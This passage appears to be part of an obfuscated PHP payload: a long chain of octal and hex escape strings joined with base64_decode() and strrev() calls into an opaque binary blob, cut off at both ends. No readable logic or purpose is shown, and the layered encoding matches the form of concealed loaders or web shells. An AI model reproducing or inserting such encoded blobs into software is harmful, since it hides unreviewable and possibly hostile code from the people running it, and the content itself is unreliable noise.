\254\57\26\25\373\325\324\345\164\32\124\133\360\254\142\251\13\370\206\104\233\76\265\113\47\262\25\76\262\252\23\47\222\210\34\213\271\165\244".base64_decode('qOMYizNKRa4yq9Aqgv/n1CqSDFyx6QzlegLFkuDtFQvmIeSXizIVYVuC/GERb3XMQRXo1kKXliIr').strrev('ƒ¾¡Ód‹6KT~ƒ‚eª$œû±=@¡ÖfÚk·ĞG(`J£}oÀë35m5¯@šä')."\277\331\335\354\36\43\74\146\321\152\370\105\356\176\322\276\140\214\307\1\217\244\52\117\161\221\123\223\65\200\214\221\230\322\303\152\102\171\170\237\157\16\145\271\236\276\243\235\334\345\123\373\242\361\174\116\42"."\x2e\x9a\x3a\x6a\x9b\x5c\x8d\xb5\x12\xf5\x47\xda\x51\x3b\x10\xed\x76\xce\xaf\x5d\xd4\x39\xbd\xdd\x8b\xce\x1a\x4d\xa5\xf\x1e\x16\x42\x77\x5b\xd8\x39\x67\x27\x39\x3d\x68\x87\x73\x95\x45\xdc\xd6\xd8\x54\x79\x9\xef\xcb\xcb\x93\x5a"."\1\254\213\140\207\235\167\45\111\147\226\376\33\36\307\35\171\25\24\163\114\323\311\221\53\141\273\315\124\243\60\53\60\256\274\101\246\57\266\140\155\203\347\24\264\207\6\212\23\245\202\323\13\44\7\47\26"."\202\332\252\55\210\155\215\126\174\350\222\325\212\57\362\125\310\261\342\66\216\305\31\122\236\7\261\247\305\66\111\164\277\51\170\106\162\102\261\3\317\163\272\127\46\60\310\205\51\110\25\375\114\321\211\261\330"."\x56\x5f\x38\x1a\x4e\x20\xb7\xc1\x29\x2\x66\x29\x58\xce\x4d\xa5\x1a\x8a\xd5\xa1\xa3\xdd\xcd\xa3\xbd\x17\x50\x16\x38\xfe\x4e\xd1\x7f\xe4\x38\x10\xd1\x61\x72\x41\x19\x37\x9d\x90\x4\x9c\xd4\xbb\x45\x65\xa\x9f\xeb\x55\xab\x9a\x24"."\xd4\x54\xd\x65\xa0\xa4\xa6\xec\x9f\x44\xc7\xdb\xce\x52\x89\x7e\xb0\x6a\xa1\xe2\x6\x82\x22\xa0\x46\x4\x58\x79\x16\x51\x5e\x6\x63\xcd\xa4\x77\xfb\x6e\x40\x38\x23\xaa\xf4\x26\x7\xe6\xb7\xd4\xdc\xd2\x36\x67\x1\xf8\x9f\xf0\x5b".strrev('–Kzé”¥5<*Ác‚®÷ŠJñkkÇ‚Æ< ¼ÀØ¸µÑÁ¶Ò?½ÁVSNáÍ½H,š*_:z')."\x5b\x41\xb3\x92\xf5\x7b\x86\x6\x74\x86\x2f\x73\xb2\x4f\xe4\x46\x79\x85\x13\xf0\xb6\x8d\x50\xed\x28\xa8\x8f\xc6\xa5\x33\xb4\x30\xb\x2c\x3e\x99\x2d\x15\x46\x3b\x84\x44\xc9\xd4\x34\x29\x2f\x17\x26\xc8\xbe\x61\x96\xd1\x36\xcb\xc0".base64_decode('mkmzXK1pA0QI52a+MOGiw717YDtekgKWZSg8QteiLri4hUuiMipYi2zKqKI/9VCuxNxWFlGYNCLU')."\x3b\xb0\x24\xd0\x2f\x5c\xb9\x9\x80\xb8\xd7\xd7\x1f\xf7\x84\x42\x55\x13\xc8\x98\x80\xad\x96\x9a\x74\x43\x37\x99\x2e\xaa\xea\xf\xfd\x4c\x13\x76\xab\xe6\x33\x52\x12\x6a\x9f\x75\xd4\x40\x68\x8d\x64\xe8\x49\xea\x9a\xa8\xc6\x4d\x98".base64_decode('LkLgm7F2lWSphVmkNGiTE4Vwcm1nu1vtZOPBDat1javTudwz4NbMDa+xCkdCAuigrBzuliC0m5tR')."\x4b\x52\xbb\x2c\xe1\xae\xee\xa8\x85\x77\xe\xe9\x5a\x29\xb\xd6\x71\x76\xab\xdf\x69\xcf\xdc\x4f\x4f\x8c\xdb\xdd\xb2\x98\x8\xe7\x58\x58\xa3\x42\x38\xdb\x9e\x95\xd9\xb9\x5f\xd5\x3\x4d\x4f\xd2\xe6\xc4\xd2\x2b\x17\x96\x57\x66\x81"."\x85\xbb\x92\xd5\x92\xdc\xe8\xbc\xc0\x2d\x38\x3f\x25\x7\x1c\xa2\x6\x96\xc5\x61\x89\xf5\x68\x97\x9d\x26\x56\x21\x90\xa2\x9c\x1c\x85\x64\xc7\xf9\x3e\x4e\x76\x91\x84\x10\xdc\xfe\xe0\x4\x8b\x73\x45\x53\xb8\x5a\x0\x15\x7\x9f\x82"."\xdb\x5f\x5d\xcd\x64\xe9\xe9\xd3\x1a\x5c\x10\x14\x10\xd6\xad\xab\x84\x11\xed\x4\x7b\x92\xa7\xa8\xda\x41\x90\x76\xec\x30\xb8\x83\xe7\x30\xb0\x80\x59\x3f\x83\xe9\x56\x44\xe2\x10\x8a\xd3\xdb\xbf\x84\x67\xc0\x93\x89\xc7\x41\xe2\x10"."\x55\xfc\x41\xb1\xd8\x50\xad\xab\x61\xdd\x3a\xb7\x4a\x6f\xec\x62\x35\xd6\xbc\x2e\x86\x8d\xe3\x31\x97\x15\x1f\xd4\x9c\x74\x35\x43\x24\x0\x3b\x26\x96\x34\x97\x92\xe9\x36\xdd\xdd\xc0\x35\x4d\xd9\xcd\x9c\x4\xaf\xeb\x3a\x3a\x3a\x87"."\xd8\x11\xf0\x30\x4d\xa3\x32\xa2\xda\x34\x9f\xe\xf2\x64\xd6\x19\x1d\x64\x41\x6f\x3f\x97\x99\x19\x59\x63\xe\xe2\x42\xba\xeb\x1e\xab\x7\xaa\x45\x65\xe6\xeb\x14\xf7\xa2\x18\xf6\x14\x8b\x62\x94\x3e\xe8\x0\xdd\xd6\xb8\x73\x6a\xc2"."\315\346\267\33\301\134\111\256\331\112\121\20\167\261\301\341\265\232\55\1\52\333\43\160\31\160\110\40\161\215\330\341\240\54\6\144\201\166\43\251\253\105\323\302\231\360\23\1\65\310\73\355\210\134\226\61\112"."\215\104\75\223\327\40\137\173\65\200\23\341\24\302\2\170\125\332\41\313\221\164\45\327\121\203\252\153\144\25\5\344\107\114\245\332\107\100\306\32\211\362\303\274\314\172\114\67\65\260\350\61\375\121\342\205\171"."\40\114\124\366\74\375\53\161\200\210\123\63\216\301\277\63\147\260\25\0\272\375\316\1\71\25\351\45\41\76\203\56\5\322\374\110\214\70\205\16\205\203\321\240\227\172\372\255\166\166\326\112\145\127\3\253\10"."\363\255\17\125\31\135\346\137\151\305\140\322\200\233\100\310\360\353\245\102\201\135\176\102\161\224\255\145\11\344\135\42\222\55\231\174\25\204\156\371\242\120\3\337\40\140\301\255\11\164\252\242\244\134\164\361\147"."\xee\x75\x8\xbc\x4a\xe\x7c\x1c\xc\xcb\xa3\xd3\x41\xf0\x42\x4a\xbf\x94\xd3\xa8\x5f\x97\xe6\xc6\xc6\x46\x67\x63\x13\xf8\x9f\x5d\x7\x91\x4f\xb4\x35\x36\x56\xa0\x34\x36\xb6\xa1\xff\x71\x2\x3a\xae\x25\x1d\x6a\x4d\x1\xf3\x97\x32"."\32\202\60\246\50\124\363\230\240\250\205\22\225\206\100\177\41\227\52\155\164\242\57\24\366\162\13\45\5\266\216\304\24\173\113\173\265\214\145\120\350\22\0\147\66\15\3\221\4\14\7\152\71\355\111\172\313"."\13\320\370\100\203\172\370\13\51\262\245\130\210\25\323\73\304\217\271\150\17\212\100\361\350\335\144\151\226\357\3\50\130\17\223\254\352\20\40\234\160\100\221\111\360\51\3\243\342\365\47\112\146\32\321\50\226".strrev('ü¢ú-”.!4ÅœÕFG,‡OrB»Ğq(øÊé=k„àO¨bÊ]7—Î,mYBFªJÏÚ00Vc').base64_decode('CrR0WPHRO/kAFHRcvPeQqzL0mgFWDWibLvSkrnEDgYpHOmgsUv0KWjj8orApMNnZGIX4KQBfEnuZ')."\343\25\241\0\173\222\55\217\47\45\74\102\141\160\217\53\136\346\301\111\164\303\202\175\314\10\267\261\6\361\17\310\175\73\321\62\130\353\113\172\316\125\324\265\14\30\11\103\250\27\204\207\252\203\31\172\45"."\146\25\44\326\40\21\117\4\102\275\13\372\376\1\41\52\166\214\17\366\175\214\55\12\250\21\266\33\21\200\126\315\10\41\301\313\274\376\212\100\270\67\31\20\166\226\310\44\311\132\6\334\364\130\41\254\146"."\337\102\102\164\117\152\222\67\66\4\313\22\202\306\25\101\340\341\200\170\212\252\152\136\102\73\260\67\370\245\237\25\136\101\145\144\206\164\120\241\36\115\41\153\332\133\353\177\116\3\147\123\54\330\170\166\172"."\x25\x9e\xcd\xc2\x49\xd3\xc3\x9e\x71\xa8\x42\x1d\x56\xa\xa8\x18\x6a\x34\x67\x60\x1\x6d\x8c\x4b\x8\x31\xa4\x32\xe0\x42\x4e\xf\xb9\xac\x6c\x8b\xda\xd5\xa\x10\xff\x33\x29\xb\xa3\xfe\xda\xa\xcc\x57\x32\xec\xc\xdc\xfb\x38\x5e"."\345\13\44\23\313\342\242\67\224\256\144\72\143\3\61\242\253\0\50\174\133\200\364\161\201\70\112\371\146\237\66\11\370\232\354\236\343\152\224\352\6\125\40\163\215\31\122\177\124\232\353\152\136\50\15\6\7"."\347\266\326\113\100\372\313\51\203\112\142\231\152\272\347\264\314\163\265\314\225\352\226\365\104\373\172\35\22\264\126\222\226\0\151\122\253\227\274\131\135\313\53\356\346\171\320\10\244\165\116\213\153\101\253\24\221"."\xd3\xb2\xae\x92\x5c\x84\x7b\x12\x5\xd6\x31\xf2\xb\x9f\xeb\x8a\xb\x55\x8e\xb\x9b\x71\x2c\x0\x50\xae\x8b\xb4\x74\xf1\x15\xde\x10\xcc\x45\x54\x2f\xc1\x4c\x41\x6f\x7e\x89\x19\x91\xe2\x4\xd1\xb1\x12\x37\xf7\x10\xd7\x4a\x7\xd6"."\x62\x21\xc2\x30\xc7\x95\xe0\x3\x3f\x96\x5b\xc3\xc3\x4f\xa3\x5c\x1e\x4c\x45\x3e\xa5\xe1\x92\x21\x90\x1a\x8c\x32\xc2\x82\x4a\xe9\x39\xf1\xa5\xa4\x41\x35\xc5\x2e\xfe\x87\x62\xc6\x70\x43\xcc\xdd\xa7\xa4\x54\xb9\x4b\x1b\xc7\xd1\x21"."\xf4\x83\xf4\x56\xa1\x12\x60\x3d\x8c\xce\xfe\x6f\xa2\xd\xb1\x61\xaa\x24\x6\x3f\xd8\xa3\xf0\x1d\x9b\x7b\x56\xc8\xd7\xed\xe4\xe8\x6c\x87\x88\xfc\x22\x73\xef\xde\xa4\x62\xc8\xab\x23\xff\x2\x2d\x9f\x96\x1e\xb5\x6f\x10\x71\x18\x3f"."\x7a\x80\xc3\x5e\x38\xa\x40\x74\xf0\xb1\x15\x12\xf0\x7d\x1e\x41\x83\x64\xc1\x65\x3a\x40\xba\x96\x2a\x25\x69\x91\x21\x4b\xac\x98\x4a\x2f\x17\x37\xaa\x3e\x32\x85\x90\xb0\x26\x3e\x6e\x34\xe\xa4\x75\xd6\x22\x3d\x56\x18\x46\xd3\x1c"."\x42\x51\x3b\x30\xac\xc1\xd2\x36\xc\x9b\x3d\x6b\x96\x3f\xd8\xcd\x94\x45\x39\xc6\x78\x73\xe3\xb0\x35\xb6\xa8\x6e\xa8\x90\x1e\x5e\x54\x5f\x7\x33\xae\x25\x30\x5c\xa\xed\x5e\x7a\xc8\x63\xa9\x8a\xf8\x55\x4b\xf7\xce\xd6\x12\x23\x6e"."\x95\x6c\x14\xdd\x84\x7e\x50\xdd\xda\xdb\xeb\x5c\xd\xf5\x9d\x9d\x7c\x1f\xe9\x86\x44\x68\x29\x81\xd5\x19\xfa\xb2\xac\x2c\xdb\x12\x9\x53\x64\x9d\xf9\xbd\x74\x3\x81\x44\x9f\x28\xfe\xc7\x39\x15\x8c\x4e\x32\xc3\xdb\xc9\xff\x34\xa7"."\73\340\43\35\76\64\214\3\355\240\117\216\351\34\156\250\37\352\254\2\141\371\102\272\122\256\332\144\320\157\154\274\143\344\41\255\30\131\332\142\364\1\57\242\310\30\43\232\214\124\351\220\51\41\322\246\324"."\xc5\x62\xb1\x14\x72\x45\xce\x54\xcd\x9\x84\x79\xaf\xaf\x9b\x1\xe2\xcd\x22\x6\x6\x50\x84\x19\x14\xaf\x7d\x48\x76\xa6\x51\x5d\x3b\x1\x32\xd3\x40\x6e\x77\x35\x74\xce\xa4\x99\xd1\xcd\x9\x25\x90\x7d\xa6\x53\x6b\xb1\x9e\x6\xf6".strrev('ş	/àÉü'."\0".'·ğFÆñ±¹ĞH´éŸuDÒ{ßM¦]ûğ hşş•Àdª])$yDcø?nñõ').base64_decode('UpCEYwb4dz74AyktANqixMbnJMAfSJ0HfudBrDT4m8O5SGcnLxi01uPsBs2uVjjI0skoXKgg3PQn')."\x46\x28\xdf\xa4\x67\x13\xf0\xa5\x7\x45\xa6\x73\x48\xce\x31\xc5\x1d\xe1\xfd\x30\xf8\xc9\x98\xe\xe7\x1d\x9c\x75\x7c\x7a\xd4\x41\xc3\x4c\x84\x7\x67\x6b\x95\x9a\x70\x5c\x86\x69\x69\xc4\x54\x34\x3c\xf0\xef\xb1\xc4\x69\xcc\x9a\x35".base64_decode('2+lqbGpuaZ0zd958cmBfKOUVnZ64uJHTxxb4o6boDz/LsR5fFw3qRSDPDPQBb6TLvqACZYhKY6PK')."\104\37\75\240\200\113\145\32\336\175\221\264\371\135\41\102\71\356\330\20\344\66\61\112\211\320\357\255\240\26\104\142\221\54\75\107\235\325\330\234\152\143\377\330\140\124\44\312\30\56\241\256\370\331\47\271\4"."\332\104\25\340\106\212\31\136\261\250\360\102\24\40\2\303\213\357\147\205\203\160\130\242\120\266\160\142\211\342\360\131\55\52\373\140\100\56\101\375\372\213\151\2\170\261\13\310\113\151\227\177\105\240\333\345\205"."\x2f\x5e\x45\x8a\xcc\x3e\xdc\x8\x2f\x21\x7a\xb7\x2c\x80\x2a\xef\x82\xbb\xbe\x2\xf3\x54\x93\x86\x37\x8b\x61\xb6\xc6\x81\x26\x39\x46\x8a\x4a\xc6\x51\x2c\x64\x1c\x19\x35\xed\x48\xe4\x8b\xe\x53\x4d\xa7\xe1\x3f\xe\x30\x86\x8e\x62".strrev('²§‰ĞÏàÉ€Â£³Xúà‡i((æ>‚€ R;©*GISF;OEÍëy½H¢JcÇ–’‡Ê0å2')."\232\122\64\260\267\62\264\134\11\251\200\215\117\1\237\240\142\20\205\254\260\364\102\240\333\327\350\132\21\146\251\343\216\51\22\354\305\254\374\326\142\46\54\305\254\264\27\43\46\372\250\33\366\305\170\110\150"."\34\77\342\45\347\240\133\167\362\337\170\276\350\202\177\110\214\120\40\242\3\215\371\142\350\325\101\120\327\160\121\104\164\67\65\301\205\21\115\127\201\144\54\127\257\110\320\236\150\150\151\163\214\351\215\211\250"."\21\222\42\324\215\124\204\245\220\270\121\211\151\151\205\246\107\331\63\67\11\325\14\201\175\270\314\265\71\361\150\2\270\21\57\102\23\127\41\11\2\1\166\110\35\247\146\345\213\135\370\276\232\343\27\141\242".base64_decode('g8F1ecyWRojQNgmqTxBQDpwdtDB4MBqH56JCyxa7Aj2+sAuVh6wh+bfhJawuei3AH2UCNkPM5LSE')."\x9c\x8b\xe3\x32\xf8\xd\x9f\x5c\x0\x5c\x85\x79\x62\x59\xec\xc2\x71\x50\x9a\xcb\x9a\x92\xa1\x3a\x5a\x39\xad\x90\x51\xcd\x52\xca\xda\xa6\x25\xa1\x8\xaa\x4a\x9\x64\x70\xd9\x50\x72\xa0\xbc\x7f\x93\xc1\x82\x21\xe7\xfe\x1d\xbe\x15"."\43\245\224\325\244\322\47\217\126\41\50\10\245\44\223\147\30\70\7\347\361\226\34\360\160\205\145\341\257\61\41\346\353\143\47\203\142\226\0\115\202\307\341\240\353\150\156\224\45\305\341\102\101\36\201\205\212"."\105\141\326\112\13\20\31\155\22\160\106\152\126\352\1\204\6\225\222\272\305\235\7\51\306\33\354\13\15\104\375\76\127\125\44\12\24\56\60\104\252\254\222\14\117\243\301\316\34\235\107\116\221\153\12\24\244"."\244\6\12\343\47\250\142\246\312\324\156\250\304\52\352\70\212\350\25\211\2\40\120\150\231\223\317\167\253\271\52\13\321\267\240\201\244\222\341\3\35\54\27\154\63\224\365\141\25\224\100\44\210\32\12\126\51".base64_decode('/sSu+MWqCINZ1VS65FzFp1CWylTaO1wXsVrf8VQK6VJlY4pRqkDxLxcWYhKUkw45ZRoOueSQ87pD')."\56\353\216\204\126\30\165\244\214\64\370\63\34\140\351\205\311\351\34\100\314\311\216\34\140\140\216\274\232\122\35\171\20\120\115\307\170\336\141\264\344\311\42\234\57\202\304\142\213\103\113\353\16\175\24\24\151"."\144\341\334\30\165\214\311\145\307\130\136\166\344\133\145\207\226\311\70\312\253\323\216\261\262\243\254\45\35\46\75\102\246\142\122\334\20\25\37\127\227\324\344\50\4\273\340\77\140\134\362\105\43\136\52\250\343".base64_decode('1Ol5XtPKUr6cTf07fKw8bcfHQgnge7pmjMoupICl6PbliKUPEYS1UEMRjLZcLDqAQJMC205kFjxs').base64_decode('z8nrM8RWQarlFYeSmpgDV4Z+AssJgkYLTMQrV1y3nKIzhyjwOEUUUYnIBYqjvn3wyijYOWCUqVZG')."\373\347\55\240\41\40\157\227\233\326\302\177\233\327\312\200\267\226\65\75\241\32\364\311\52\326\364\141\121\330\374\317\63\211\314\360\277\310\305\345\323\214\122\320\377\353\257\12\231\46\24\152\147\364\237\147\347".base64_decode('eUBHUVP2/6KjYKa4+HocQTJcRTUJObWr0cWvXZBYQ+deK5ilZUe6FU61MphmZUdeK4MZrTr0fDnh').strrev('„¡ä‹ y¿Š	˜ÿğ~Ì²Œvœµ'."\0".'p	ø˜2ÉhìÓ%·s&–1¡"XA0yÌÊ'."\0".'A–È')."\x7\xa2\x7a\x59\x4b\x50\xb6\x3\xf5\x8b\x5d\x5a\x1\x3e\xde\x0\x9f\x36\x70\x8d\xc1\xa3\x3b\xc7\x54\xc2\x75\x25\x7e\x16\x9d\xbc\x55\x66\x98\xf8\x6f\xd9\x80\xc3\x3a\x61\x93\xe4\x50\x2d\x2e\x98\x62\xfc\xc7\x2c\xc2\x56\x16\x4e\x16"."\112\302\265\105\173\30\141\106\56\166\221\126\140\51\21\46\70\230\374\311\321\110\146\170\143\223\214\347\64\155\264\124\24\130\1\116\305\273\154\303\65\324\330\264\266\151\330\305\247\367\277\303\304\305\376\73\54".base64_decode('xBgEJN4zGB2lx7+9iuRLQgZhD8n5JueXa0V+uZYwu2GL8GsnDsZ1YQLsBHoWSn4ruO6QDvaM4ryq')."\262\173\40\42\27\145\306\304\26\330\260\124\204\115\276\157\301\262\261\171\13\163\267\260\350\74\133\274\55\73\341\12\60\32\24\34\256\340\347\172\62\253\322\173\51\164\101\302\5\377\122\201\156\15\224\224\40"."\357\203\14\271\224\256\24\204\127\207\100\213\300\16\15\72\223\141\40\320\211\302\143\43\202\206\226\306\44\24\64\131\160\160\111\157\260\313\203\374\77\304\173\202\364\271\355\216\216\116\103\274\41\313\2\172\161".base64_decode('gg9l2LOWg7IO9SAcUaInKJFUSSuwOy5yLjaGUXEk1BOKewaiPYIPDQYKEUUe9K44hATDgaM93GNW').base64_decode('QjboedHg4KATnrdD+5kkepK8CyZKkBHmO2pGtVQyp5VSNbxAd5OrUWptbJIGClSflG6P6OvzBc0p').base64_decode('PP5oe3/emmh54Jh+HCeBvQQgK2HHHCwrumAEQd/sJr99weVEudkbDJHzg75lTJ3FpxSp0OyteAwa')."\151\340\214\347\163\13\231\176\217\160\52\332\356\153\53\352\132\61\255\26\122\22\300\51\30\155\276\216\32\237\147\171\133\115\47\110\222\163\71\230\52\271\73\333\335\34\221\214\130\50\34\14\165\7\230\367\214".base64_decode('EBwCcjxGnrD3k5lBPmVRf68BPV3D1d9rUJ1qJOpLDxkU4WAT9cIrmvsSxVJoRif0A4wyoxtEID4/')."\164\222\40\220\107\226\235\202\333\54\75\60\220\130\40\366\210\26\210\240\43\340\372\4\57\332\141\257\302\216\111\102\255\43\64\151\160\327\130\322\131\256\214\142\222\353\130\4\207\265\113\271\341\272\343\114\251"."\272\202\374\332\300\314\66\264\252\37\245\312\123\310\301\202\340\353\260\44\314\142\105\60\230\346\306\336\11\146\177\1\212\104\367\165\266\201\46\321\110\107\15\261\120\244\363\2\62\303\232\116\314\367\332\43\155".strrev('¢}eË°Bi™-Šs¦¯bM½~áh•§Jª5lT@ Ä'."\r".'“·“DˆL[»Tö‘3_»xz ÎäĞT8Ê').base64_decode('Tary+nququq8iUokTKwvWnXSQksqULWO+XNbGxsd+ZJhOnXF+gou7CiJnB/2RZx4YjuXq4Af+Khh').base64_decode('OHK00CaRieCQ6PzAoZAn6u1xSIhYHdISfxSAB8A/2HDBIcF5DZLBPHdI0CzbIQ3041+uig76DpMF')."\x32\x19\x42\x5d\x9\xe2\x90\xa2\x29\xd1\xb8\x49\x94\x24\xc1\x19\xb\xb5\x6c\x48\xaf\x63\x0\x1d\xd1\x7c\xdb\xa0\x5a\x68\x69\x86\x9a\xe8\xd8\x28\xa\xee\xd3\x9\x31\x0\xee\x58\xd2\xb\x6d\xd8\x5\x94\xe1\xcc\xab\x49\xb0\xaa\x83"."\25\325\11\110\242\15\252\362\131\313\240\27\231\377\377\22\140\55\250\72\374\377\277\24\250\43\341\61\301\42\223\50\231\212\361\137\225\101\31\34\353\52\254\235\324\111\126\205\46\251\271\261\121\12\56\203\150".base64_decode('JGW6kIt2MuEFeHzIKo31MlJymb6zm4WTTC0Uqe9LxKjAwIcHw8z/nWZdDqIWbk0alqKcmow21ORP')."\301\115\6\310\73\301\332\1\327\366\262\2\323\150\147\141\114\314\312\122\155\350\53\230\213\61\260\5\21\24\210\61\301\44\317\225\14\120\30\307\306\151\14\75\5\327\241\116\265\0\237\345\65\21\157\303\20"."\x86\xa0\x8d\x15\x14\x3a\xe9\x61\x7e\x68\x35\xe8\x46\x40\x37\x67\xcc\x30\x1f\x46\x64\xf9\x88\xaf\xd0\xce\x0\x2e\x5a\x81\x28\x14\x66\x6d\x15\xb4\x11\xeb\xa4\xb3\x42\x2b\xca\xab\x4b\xa\x83\xb7\xd9\x66\x9\x6b\x33\xca\xc4\xc8\xc0"."\326\143\24\313\322\265\214\134\160\221\360\31\74\147\24\175\203\63\240\2\136\41\332\44\350\20\332\11\370\111\271\202\45\127\320\2\34\320\51\171\342\224\213\370\267\256\254\130\231\227\56\254\210\330\160\160\205".strrev('±LĞ“TØ“ 0eÂJ4¡¤Â)–Œ¡*â[‘?|À4êí¯‚wlû±ù‹	ö¥`RTu^?Ó')."\xb5\x74\x1a\x1e\x47\x90\x18\xc1\x42\xfb\x49\x9a\x5\x6f\x16\x69\xac\x98\x93\xb\x8a\x41\x63\x20\xab\x28\xd8\x2e\x17\x33\x2e\xb7\x66\x64\xa8\x34\x59\x38\x5b\x17\xab\x1e\xc7\xa6\x97\x4\x32\x1e\x2f\x2a\x39\x7c\x58\x82\x8c\xe2\x28"."\174\142\12\170\62\247\103\47\163\51\61\256\346\341\25\243\314\52\251\3\221\35\160\243\121\212\223\321\25\245\140\201\44\162\45\305\2\220\163\305\254\214\40\30\100\336\323\360\46\334\336\214\333\253\273\275\144"."\xab\xbd\x2b\xfe\xd9\x8d\x24\x93\x55\x8b\xb8\xcf\xa2\xaf\x70\xa0\x6\xe2\x9d\x34\xf4\xc5\x93\xa1\x6f\x41\xd8\xe0\xf0\x6a\xae\x6a\x42\x91\x4a\x75\x63\x5c\x63\x27\x2b\xe8\xd2\x8\xe8\xf0\xb2\x1a\xdd\x49\x8\x29\x61\xcd\x64\x6b\x2b".base64_decode('t19CSekc1egK9C2Jd/cGQnEk4gf7o55eWwLgmdGAtwLcFaSufW21TuStGmdqAS3zIe5VCERlg7m2').strrev(':4=íä°j	ªõßÙ7Ì€oMÄˆ‰FİÕÕMÉ¡Ls—‘'."\r".'„&]›ºÛƒ€hI#%')."\x9\x86\x3d\xe1\x95\xdc\x71\x31\x48\x89\x7a\xc2\x53\xa4\xc0\x3c\xc4\x57\x20\x75\x5f\xb7\x70\xf1\xe2\xc5\xf4\x71\xd5\x64\xe\x5b\x69\x42\x13\x1\x76\x5f\xe\xa0\xf0\xf4\x49\xa9\x84\xca\x95\x98\x50\x3\xf\xd9\x2d\x59\xee\xdb\xc3"."\262\356\301\55\250\222\170\264\132\234\42\121\55\322\67\41\212\124\113\275\130\242\227\331\354\70\115\160\17\64\217\374\216\223\337\304\44\175\377\102\47\272\3\111\231\344\127\15\162\76\226\231\204\252\157\64\14"."\x56\x9a\x1c\x3f\xc7\x44\x3a\xc5\xc3\x92\x57\x2e\xd4\x9a\x52\x10\xa0\x2d\x94\xfa\xa0\xb1\x52\x21\x23\x4d\x82\x96\x63\xaf\xd5\x6\x77\x32\x62\x64\x95\x5c\x2e\xe\x55\xde\x48\x75\x93\x59\x4d\xb2\x6f\x20\x69\x74\xea\x6f\xf0\x62\x8"."\270\104\365\65\40\363\4\25\44\223\212\314\144\341\266\237\173\317\40\166\205\56\27\121\342\201\116\27\0\63\261\42\41\7\245\324\233\2\72\66\210\3\76\47\370\261\204\222\222\4\227\26\144\5\141\161\233".base64_decode('s0xLkWFrw75yUsr4Qgk5giK+x6v7XkKfkcBnoDmYhG19LQqCGKEC0mbRM8QJlRWe1djUKFh0BLz+')."\110\174\151\4\272\104\355\15\120\67\74\326\204\0\110\213\206\247\110\361\204\247\112\11\166\55\235\42\305\113\367\17\326\224\336\140\60\42\172\174\262\125\157\40\44\370\201\44\373\143\270\166\67\21\245\317\376"."\201\136\302\277\142\204\202\143\204\27\173\211\172\123\254\64\253\261\225\32\373\360\307\102\141\337\304\205\47\275\361\221\31\16\153\150\207\206\303\122\122\306\106\61\11\5\113\5\112\12\372\200\205\265\223\14\40"."\53\123\116\76\3\72\170\166\273\353\134\263\353\147\316\310\213\260\130\3\4\306\32\334\63\6\110\65\146\160\30\100\230\311\340\356\143\352\152\326\326\326\273\32\352\142\115\365\114\175\53\106\55\311\142\261\22"."\121\176\32\136\323\272\216\273\233\214\15\271\32\142\303\63\5\155\262\65\0\260\216\1\306\262\364\74\14\71\301\140\130\106\103\335\120\115\355\260\253\141\350\230\130\154\30\6\353\1\254\15\302\143\21\127\103"."\xbd\x63\xd1\x4c\xf7\x80\x6a\x88\xf8\xd8\x69\xf6\x94\x38\xa4\xcb\xa9\x2d\x59\x91\x1d\xee\x43\x91\x45\x5\xbb\x24\x64\x49\x21\xea\xd3\x86\xfc\x80\x29\xb\x5e\xf4\xcc\x7c\x51\x20\x5b\xe8\x4a\x69\x6e\xab\xa8\x98\x8e\x21\x74\x49\x29"."\xd1\xb5\xf\x5\xa9\xf1\x56\x91\x2b\xe8\x5b\x95\x69\x59\xd4\x32\x5b\x1a\xa5\x2e\x20\xaa\x59\xc\xab\x2d\xae\xfe\x84\xda\xe9\xb3\x85\x82\xe2\xa2\xb7\x4c\x4\x11\xdf\x40\x81\x71\xe1\x6d\x5a\xa1\xae\x40\x5e\x13\xfc\xc3\xc0\x82\xa8"."\123\45\42\10\310\106\166\12\207\102\330\267\7\150\200\120\47\304\132\134\160\303\57\54\264\75\66\357\134\144\33\125\331\207\70\14\10\231\114\55\204\7\76\205\366\65\324\345\11\327\11\37\113\220\36\200\175"."\34\267\175\220\131\155\347\204\355\50\327\201\101\322\4\327\302\242\121\52\42\45\345\42\274\257\111\341\223\161\320\361\344\333\54\64\20\202\76\361\40\47\210\323\63\124\1\24\350\17\304\43\201\243\375\25\11"."\320\375\163\365\24\260\336\107\3\124\374\21\340\375\101\344\206\316\2\37\350\137\326\37\34\254\206\32\355\13\161\131\102\110\362\172\372\243\161\141\117\212\67\53\140\313\305\166\53\124\141\75\251\47\133\232\23"."\x6c\x9a\x31\xf7\x6c\x54\x96\x27\x33\x85\xae\xf9\xdc\xdb\xc2\xb8\x93\xe9\xef\xd3\xfd\x8e\x8f\x3b\x49\x21\xd9\xd0\xc1\x2b\xa9\x2\x72\x19\x43\x32\x88\xa7\x38\x62\xb2\x43\xaa\x7a\x86\xc3\x36\x54\xc4\x90\xc3\x76\x3c\x99\x50\xb\x32".strrev('š$3¾)Wš´=1«Ú1+Á]™ÂÜFGU é‹˜ì‹®ï2Tk–AÚúŠ7è8k3Îß§›`u')."\xc0\x4d\x8a\x27\x69\x96\xc4\xf7\x8c\x84\xc7\xe8\x41\x6c\x9\xf7\xc4\x2a\x98\xe9\x39\x9b\x24\xd6\xa2\x38\x2e\x19\x47\x66\xb\x9\x58\x53\xbc\x8a\xa9\x9f\xcd\x99\x2\xb2\x9d\xc5\x93\x17\x59\x8d\x47\x4a\x9\xe6\x12\xc7\x66\x9b\x47"."\xbd\xc4\x4a\xa2\x55\x1c\xf5\x3\xb\xb\x40\x4f\xf0\xc0\x16\x18\x62\x1a\x28\x16\xbe\x45\xcd\x5b\x26\x66\x41\xdf\xac\xc8\x82\xd3\xa0\xf1\x1a\x67\x65\x62\x8a\x1\x15\xb2\x6\xa8\xd8\x55\x2d\xa5\xca\xa7\x50\x92\xd0\xa3\x49\xba\x8f".base64_decode('o27uSCfxvjJpfzc76cuAoiNZYvpGOtfZLAnkBXmPQBH4NIJ1IzfmzHEcDTqBUPjgc2NB/D4QG1r0').base64_decode('kBCL6YIhmZKiQ4ce4qm6lmAgeqlnoFo67iyY7LN4/LQhgClvTUdfFCuTxq8yWTwf2grRcZpP4f5J')."\x50\x2e\xde\xe\xee\x3c\x15\x80\xc0\xde\x7\xbd\x71\xc6\x3b\x86\xbb\xb5\xc3\x2f\xf\x51\x17\xaf\x9e\x54\xca\xe\x8e\x6a\xc\x58\xe9\x1a\xcf\xc5\x9c\xd3\x12\x4f\xfb\x60\x53\x1a\x9\x4\xfb\xeb\xea\xa1\x94\x65\xf1\x19\xd0\x37\xc1"."\174\241\203\221\104\353\170\237\74\316\7\212\105\150\52\243\123\303\22\301\336\46\55\271\31\210\141\215\51\11\306\266\11\43\355\11\271\31\250\213\166\23\173\372\2